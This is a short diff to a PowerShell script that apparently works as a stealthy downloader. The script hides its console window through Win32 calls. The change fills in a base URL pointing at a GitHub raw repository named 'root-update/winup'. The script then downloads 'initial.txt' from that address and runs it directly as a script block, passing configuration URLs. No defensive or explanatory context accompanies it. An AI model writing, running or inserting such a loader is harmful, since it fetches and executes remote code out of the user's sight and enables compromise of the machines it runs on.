@@ -1,5 +1,5 @@
 Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();' -EA 0
 [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)
-$base='http://'
+$base='https://raw.githubusercontent.com/root-update/winup/refs/heads/main'
 $initial = (New-Object System.Net.WebClient).DownloadString("$base/initial.txt")
 & ([ScriptBlock]::Create($initial)) -ConfigUrl "$base/test.json" -InitialScriptUrl "$base/initial.txt"
